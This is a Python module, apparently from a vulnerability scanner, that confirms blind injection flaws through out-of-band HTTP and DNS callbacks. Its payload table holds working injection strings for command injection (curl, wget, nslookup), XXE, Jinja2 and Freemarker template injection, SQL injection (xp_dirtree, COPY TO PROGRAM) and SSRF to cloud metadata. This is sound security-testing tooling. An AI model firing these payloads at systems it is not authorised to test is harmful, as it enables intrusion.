"""Out-of-Band verification utility — high-level API for blind vulnerability confirmation.

Wraps CallbackServer with polyglot payload generation, configurable polling
with exponential backoff, and batch verification.

Usage::

    probe = ctx.oob.create_probe("rce", target.host, "cmd_param")
    for payload in probe.payloads:
        await send_payload(payload.value)
    result = await ctx.oob.verify(probe.token, timeout=8)
    if result.confirmed:
        # Blind vulnerability confirmed via OOB callback
"""

from __future__ import annotations

import asyncio
import logging
import time
from dataclasses import dataclass, field
from enum import StrEnum
from typing import TYPE_CHECKING, Any

if TYPE_CHECKING:
    from basilisk.core.callback import CallbackServer

logger = logging.getLogger(__name__)


class OobVulnType(StrEnum):
    """Vulnerability types supported by OOB probes."""
    RCE = "rce"
    SSRF = "ssrf"
    XXE = "xxe"
    SSTI = "ssti"
    SQLI = "sqli"


@dataclass(frozen=True)
class OobPayload:
    """Single OOB payload with context."""
    value: str
    protocol: str         # "http" or "dns"
    technique: str        # e.g. "curl", "nslookup", "xxe_entity"
    description: str = ""


@dataclass
class OobProbe:
    """A configured OOB probe ready for deployment."""
    token: str
    vuln_type: OobVulnType
    target: str
    param: str
    payloads: list[OobPayload] = field(default_factory=list)
    created_at: float = field(default_factory=time.time)


@dataclass
class OobResult:
    """Result of verifying an OOB probe."""
    confirmed: bool = False
    hits: list[Any] = field(default_factory=list)  # list[CallbackHit]
    protocol: str = ""
    source_ip: str = ""
    latency_ms: float = 0.0
    poll_attempts: int = 0
    timeout_reached: bool = False


# ---------------------------------------------------------------------------
# Polyglot payload templates per vulnerability type
# ---------------------------------------------------------------------------

_PAYLOAD_TEMPLATES: dict[OobVulnType, list[dict[str, str]]] = {
    OobVulnType.RCE: [
        {
            "template": ";curl {http_url}",
            "protocol": "http",
            "technique": "curl",
            "description": "Linux curl HTTP callback",
        },
        {
            "template": "|wget {http_url} -O /dev/null",
            "protocol": "http",
            "technique": "wget",
            "description": "Linux wget HTTP callback",
        },
        {
            "template": ";nslookup {dns_domain}",
            "protocol": "dns",
            "technique": "nslookup",
            "description": "DNS lookup callback",
        },
        {
            "template": "$(curl {http_url})",
            "protocol": "http",
            "technique": "subshell_curl",
            "description": "Subshell curl callback",
        },
        {
            "template": "`curl {http_url}`",
            "protocol": "http",
            "technique": "backtick_curl",
            "description": "Backtick curl callback",
        },
        {
            "template": ";ping -c 1 {dns_domain}",
            "protocol": "dns",
            "technique": "ping",
            "description": "Ping DNS callback",
        },
        {
            "template": "& nslookup {dns_domain}",
            "protocol": "dns",
            "technique": "win_nslookup",
            "description": "Windows nslookup callback",
        },
        {
            "template": "|curl {http_url}",
            "protocol": "http",
            "technique": "pipe_curl",
            "description": "Pipe curl callback",
        },
        {
            "template": ";dig {dns_domain}",
            "protocol": "dns",
            "technique": "dig",
            "description": "DNS dig callback",
        },
    ],
    OobVulnType.SSRF: [
        {
            "template": "{http_url}",
            "protocol": "http",
            "technique": "direct_url",
            "description": "Direct URL fetch",
        },
        {
            "template": "http://{dns_domain}",
            "protocol": "dns",
            "technique": "dns_resolve",
            "description": "DNS resolution via URL",
        },
        {
            "template": "http://{dns_domain}/latest/meta-data/",
            "protocol": "dns",
            "technique": "metadata_dns",
            "description": "Cloud metadata via DNS domain",
        },
    ],
    OobVulnType.XXE: [
        {
            "template": (
                '<?xml version="1.0"?>'
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{http_url}">]>'
                '<foo>&xxe;</foo>'
            ),
            "protocol": "http",
            "technique": "xxe_entity",
            "description": "XXE external entity HTTP fetch",
        },
        {
            "template": (
                '<?xml version="1.0"?>'
                '<!DOCTYPE foo [<!ENTITY % remote SYSTEM "{http_url}">%remote;]>'
                '<foo/>'
            ),
            "protocol": "http",
            "technique": "xxe_parameter_entity",
            "description": "XXE parameter entity HTTP fetch",
        },
    ],
    OobVulnType.SSTI: [
        {
            "template": (
                "{{{{request.__class__.__mro__[2].__subclasses__()"
                "[40]('curl {http_url}',shell=True,stdout=-1).communicate()}}}}"
            ),
            "protocol": "http",
            "technique": "jinja2_subprocess",
            "description": "Jinja2 subprocess curl callback",
        },
        {
            "template": (
                '${{\"freemarker.template.utility.Execute\"'
                '?new()(\"curl {http_url}\")}}'
            ),
            "protocol": "http",
            "technique": "freemarker_exec",
            "description": "Freemarker Execute curl callback",
        },
    ],
    OobVulnType.SQLI: [
        {
            "template": "' AND LOAD_FILE('{http_url}')-- ",
            "protocol": "http",
            "technique": "mysql_load_file",
            "description": "MySQL LOAD_FILE HTTP fetch",
        },
        {
            "template": "'; EXEC xp_dirtree '//{dns_domain}/x';-- ",
            "protocol": "dns",
            "technique": "mssql_xp_dirtree",
            "description": "MSSQL xp_dirtree DNS callback",
        },
        {
            "template": (
                "'; COPY (SELECT '') TO PROGRAM 'curl {http_url}';-- "
            ),
            "protocol": "http",
            "technique": "pg_copy_program",
            "description": "PostgreSQL COPY TO PROGRAM callback",
        },
    ],
}


# ---------------------------------------------------------------------------
# OOB Verifier
# ---------------------------------------------------------------------------

class OobVerifier:
    """High-level OOB verification wrapping CallbackServer."""

    def __init__(self, callback: CallbackServer) -> None:
        self._callback = callback
        self._probes: dict[str, OobProbe] = {}

    @property
    def available(self) -> bool:
        """True if callback server is usable."""
        return self._callback is not None

    def create_probe(
        self,
        vuln_type: str | OobVulnType,
        target: str,
        param: str = "",
        *,
        extra_payloads: list[str] | None = None,
    ) -> OobProbe:
        """Create an OOB probe with ready-to-use polyglot payloads.

        Args:
            vuln_type: Vulnerability type (rce, ssrf, xxe, ssti, sqli).
            target: Target host or URL.
            param: Parameter name being tested.
            extra_payloads: Additional payload templates with {http_url}/{dns_domain}.
        """
        vtype = OobVulnType(vuln_type) if isinstance(vuln_type, str) else vuln_type
        token = self._callback.generate_token(
            plugin=f"oob_{vtype.value}",
            target=target,
            payload_type=vtype.value,
        )
        http_url = self._callback.build_payload_url(token)
        dns_domain = self._callback.build_dns_payload(token)

        payloads: list[OobPayload] = []
        for tmpl in _PAYLOAD_TEMPLATES.get(vtype, []):
            try:
                value = tmpl["template"].format(
                    http_url=http_url,
                    dns_domain=dns_domain,
                    token=token,
                )
            except KeyError:
                continue
            payloads.append(OobPayload(
                value=value,
                protocol=tmpl["protocol"],
                technique=tmpl["technique"],
                description=tmpl.get("description", ""),
            ))

        if extra_payloads:
            for p in extra_payloads:
                try:
                    value = p.format(
                        http_url=http_url,
                        dns_domain=dns_domain,
                        token=token,
                    )
                except KeyError:
                    value = p
                payloads.append(OobPayload(
                    value=value,
                    protocol="http",
                    technique="custom",
                ))

        probe = OobProbe(
            token=token,
            vuln_type=vtype,
            target=target,
            param=param,
            payloads=payloads,
        )
        self._probes[token] = probe
        logger.debug(
            "OOB probe created: type=%s target=%s payloads=%d",
            vtype, target, len(payloads),
        )
        return probe

    async def verify(
        self,
        token: str,
        *,
        timeout: float = 10.0,
        poll_interval: float = 0.5,
        backoff_factor: float = 1.5,
        max_interval: float = 3.0,
    ) -> OobResult:
        """Poll for callback hits with exponential backoff.

        Args:
            token: Probe token to check.
            timeout: Maximum seconds to wait.
            poll_interval: Initial poll interval in seconds.
            backoff_factor: Multiply interval by this after each poll.
            max_interval: Maximum poll interval.
        """
        result = OobResult()
        start = time.monotonic()
        interval = poll_interval
        attempts = 0

        while time.monotonic() - start < timeout:
            attempts += 1
            hits = self._callback.get_hits(token)
            if hits:
                first = hits[0]
                probe = self._probes.get(token)
                latency = 0.0
                if probe:
                    latency = (first.timestamp - probe.created_at) * 1000
                return OobResult(
                    confirmed=True,
                    hits=list(hits),
                    protocol=first.protocol,
                    source_ip=first.source_ip,
                    latency_ms=latency,
                    poll_attempts=attempts,
                )
            await asyncio.sleep(interval)
            interval = min(interval * backoff_factor, max_interval)

        result.poll_attempts = attempts
        result.timeout_reached = True
        return result

    async def verify_batch(
        self,
        tokens: list[str],
        *,
        timeout: float = 15.0,
    ) -> dict[str, OobResult]:
        """Poll multiple probes concurrently."""
        tasks = {
            token: asyncio.create_task(self.verify(token, timeout=timeout))
            for token in tokens
        }
        results: dict[str, OobResult] = {}
        done, pending = await asyncio.wait(
            tasks.values(), timeout=timeout + 1,
        )
        for token, task in tasks.items():
            if task in done:
                results[token] = task.result()
            else:
                task.cancel()
                results[token] = OobResult(timeout_reached=True)
        return results


class NoopOobVerifier:
    """Fallback when CallbackServer is unavailable. All checks return unconfirmed."""

    @property
    def available(self) -> bool:
        return False

    def create_probe(
        self,
        vuln_type: str | OobVulnType = OobVulnType.RCE,
        target: str = "",
        param: str = "",
        **kwargs: Any,
    ) -> OobProbe:
        return OobProbe(
            token="",
            vuln_type=(
                OobVulnType(vuln_type)
                if isinstance(vuln_type, str)
                else vuln_type
            ),
            target=target,
            param=param,
        )

    async def verify(self, token: str, **kwargs: Any) -> OobResult:
        return OobResult(confirmed=False, timeout_reached=True)

    async def verify_batch(
        self, tokens: list[str], **kwargs: Any,
    ) -> dict[str, OobResult]:
        return {t: OobResult(timeout_reached=True) for t in tokens}
